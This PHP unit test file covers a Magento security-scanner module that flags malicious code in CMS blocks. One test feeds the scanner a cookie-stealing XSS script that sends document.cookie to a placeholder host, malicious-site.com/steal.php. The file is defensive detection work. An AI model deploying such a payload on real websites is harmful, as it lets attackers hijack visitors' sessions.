<?php
namespace C0defusi0n\SecurityScanner\Test\Unit\Cron;

use C0defusi0n\SecurityScanner\Cron\SecurityScan;
use Magento\Cms\Model\ResourceModel\Block\CollectionFactory as BlockCollectionFactory;
use Magento\Framework\TestFramework\Unit\Helper\ObjectManager;
use PHPUnit\Framework\TestCase;
use Psr\Log\LoggerInterface;
use Magento\Framework\Notification\NotifierInterface;
use Magento\Framework\Mail\Template\TransportBuilder;
use Magento\Store\Model\StoreManagerInterface;
use Magento\Framework\Translate\Inline\StateInterface;
use Magento\Framework\App\Config\ScopeConfigInterface;
use Magento\Framework\HTTP\Client\Curl;
use Magento\Framework\App\State;
use Magento\Framework\ObjectManagerInterface;

class SecurityScanTest extends TestCase
{
    /**
     * @var SecurityScan
     */
    private $securityScan;

    /**
     * @var BlockCollectionFactory|\PHPUnit\Framework\MockObject\MockObject
     */
    private $blockCollectionFactoryMock;

    /**
     * @var LoggerInterface|\PHPUnit\Framework\MockObject\MockObject
     */
    private $loggerMock;

    /**
     * @var NotifierInterface|\PHPUnit\Framework\MockObject\MockObject
     */
    private $notifierMock;

    /**
     * @var TransportBuilder|\PHPUnit\Framework\MockObject\MockObject
     */
    private $transportBuilderMock;

    /**
     * @var StoreManagerInterface|\PHPUnit\Framework\MockObject\MockObject
     */
    private $storeManagerMock;

    /**
     * @var StateInterface|\PHPUnit\Framework\MockObject\MockObject
     */
    private $inlineTranslationMock;

    /**
     * @var ScopeConfigInterface|\PHPUnit\Framework\MockObject\MockObject
     */
    private $scopeConfigMock;

    /**
     * @var Curl|\PHPUnit\Framework\MockObject\MockObject
     */
    private $curlMock;

    /**
     * @var State|\PHPUnit\Framework\MockObject\MockObject
     */
    private $appStateMock;

    /**
     * @var ObjectManagerInterface|\PHPUnit\Framework\MockObject\MockObject
     */
    private $objectManagerMock;

    /**
     * Set up the test
     */
    protected function setUp(): void
    {
        $this->blockCollectionFactoryMock = $this->createMock(BlockCollectionFactory::class);
        $this->loggerMock = $this->createMock(LoggerInterface::class);
        $this->notifierMock = $this->createMock(NotifierInterface::class);
        $this->transportBuilderMock = $this->createMock(TransportBuilder::class);
        $this->storeManagerMock = $this->createMock(StoreManagerInterface::class);
        $this->inlineTranslationMock = $this->createMock(StateInterface::class);
        $this->scopeConfigMock = $this->createMock(ScopeConfigInterface::class);
        $this->curlMock = $this->createMock(Curl::class);
        $this->appStateMock = $this->createMock(State::class);
        $this->objectManagerMock = $this->createMock(ObjectManagerInterface::class);

        $objectManager = new ObjectManager($this);
        $this->securityScan = $objectManager->getObject(
            SecurityScan::class,
            [
                'blockCollectionFactory' => $this->blockCollectionFactoryMock,
                'logger' => $this->loggerMock,
                'notifier' => $this->notifierMock,
                'transportBuilder' => $this->transportBuilderMock,
                'storeManager' => $this->storeManagerMock,
                'inlineTranslation' => $this->inlineTranslationMock,
                'scopeConfig' => $this->scopeConfigMock,
                'curl' => $this->curlMock,
                'appState' => $this->appStateMock,
                'objectManager' => $this->objectManagerMock
            ]
        );
    }

    /**
     * Test isModuleEnabled method
     */
    public function testIsModuleEnabled()
    {
        $this->scopeConfigMock->expects($this->once())
            ->method('getValue')
            ->with('security_scanner/general/enabled')
            ->willReturn('1');

        $reflection = new \ReflectionClass(get_class($this->securityScan));
        $method = $reflection->getMethod('isModuleEnabled');
        $method->setAccessible(true);

        $this->assertTrue($method->invoke($this->securityScan));
    }

    /**
     * Test findMaliciousPatterns method with safe content
     */
    public function testFindMaliciousPatternsWithSafeContent()
    {
        $safeContent = "This is a safe content without any malicious code.";

        $reflection = new \ReflectionClass(get_class($this->securityScan));
        $method = $reflection->getMethod('findMaliciousPatterns');
        $method->setAccessible(true);

        $result = $method->invoke($this->securityScan, $safeContent);
        $this->assertIsArray($result);
        $this->assertEmpty($result);
    }

    /**
     * Test findMaliciousPatterns method with suspicious content
     */
    public function testFindMaliciousPatternsWithSuspiciousContent()
    {
        $suspiciousContent = "<script>document.location='http://malicious-site.com/steal.php?cookie='+document.cookie</script>";

        $reflection = new \ReflectionClass(get_class($this->securityScan));
        $method = $reflection->getMethod('findMaliciousPatterns');
        $method->setAccessible(true);

        $result = $method->invoke($this->securityScan, $suspiciousContent);
        $this->assertIsArray($result);
        $this->assertNotEmpty($result);
    }

    /**
     * Test generate detailed report method
     */
    public function testGenerateDetailedReport()
    {
        $suspiciousBlocks = [
            [
                'block_id' => '1',
                'title' => 'Test Block',
                'identifier' => 'test-block',
                'pattern' => 'eval(',
                'content' => 'Some content with eval() function'
            ]
        ];

        $reflection = new \ReflectionClass(get_class($this->securityScan));
        $method = $reflection->getMethod('generateDetailedReport');
        $method->setAccessible(true);

        $report = $method->invoke($this->securityScan, $suspiciousBlocks);
        $this->assertIsString($report);
        $this->assertStringContainsString('Test Block', $report);
        $this->assertStringContainsString('test-block', $report);
        $this->assertStringContainsString('eval(', $report);
    }
}
